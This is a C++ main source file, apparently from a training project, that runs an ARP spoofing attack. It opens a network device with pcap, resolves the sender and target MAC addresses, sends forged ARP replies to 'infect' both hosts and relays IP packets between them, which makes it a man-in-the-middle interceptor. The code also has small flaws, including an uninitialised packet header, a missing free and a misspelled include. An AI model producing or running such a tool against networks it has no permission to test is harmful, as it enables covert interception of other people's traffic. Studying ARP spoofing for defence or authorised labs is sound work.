#include <sfdafx.h>
#include <send_arp.h>
#include <util.h>


int main (int argc, const char * argv[])
{
    if ((argc % 2 == 1 )&& (argc != 0)) {
        usage();
        return -1;

        }
    const char *dev = argv[1];
    int session = (argc -2) /2;

    while(true){
        int i=0;
        char key;
        while(i<session){

            const u_char* sender_packet=nullptr;
            const u_char* target_packet=nullptr;
            struct pcap_pkthdr* header;
            uint32_t SenderIP = inet_addr(argv[i+2]);
            uint32_t TargetIP = inet_addr(argv[i+3]);
            char errbuf[PCAP_ERRBUF_SIZE];
            pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
            ARP *Sen_ARP_Pac = (ARP*)malloc(sizeof(ARP));
            ARP * Tar_ARP_Pac = (ARP*)malloc(sizeof(ARP));


   if (handle == nullptr) {
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
   }

    //Sender Set
    ARP_REQ_ToSender_Set(dev,Sen_ARP_Pac, SenderIP);//Set ARP_Request_Packet
    sender_packet=find_Sender_Mac(handle,header,Sen_ARP_Pac,sender_packet);
    ARP_REP_ToSender_Set(Sen_ARP_Pac,argv,sender_packet); //Set ARP_Reply_Packet

    //Target Set
    ARP_REQ_ToTarget_Set(dev,Tar_ARP_Pac,SenderIP,TargetIP);

    target_packet=find_Target_Mac(handle,header,Tar_ARP_Pac,target_packet);
    ARP_REP_ToTarget_Set(Tar_ARP_Pac,argv,target_packet);

    //First infection

    Send_ARP_ToSender(handle,Sen_ARP_Pac,sizeof(ARP));
    Send_ARP_ToTarget(handle,Tar_ARP_Pac,sizeof(ARP));

//    //Send ARP to Sender & Target

    Send_IP_REL(handle,header,Tar_ARP_Pac,Sen_ARP_Pac, target_packet,dev, argv);

    i++;
    free(Sen_ARP_Pac);
        }

    cmpkey(key);
    return 0;
    }
}
